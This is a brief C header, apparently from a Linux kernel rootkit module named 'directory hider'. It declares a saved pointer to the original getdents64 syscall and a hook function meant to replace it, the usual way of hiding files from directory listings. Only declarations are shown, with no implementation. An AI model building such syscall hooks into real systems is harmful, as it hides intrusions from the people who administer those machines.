#ifndef HEADER_DIRECTORY_HIDER
#define HEADER_DIRECTORY_HIDER

#include <linux/types.h>
#include <linux/ptrace.h>
#include <linux/syscalls.h>

extern asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage long hook_getdents64(const struct pt_regs *regs);

#endif
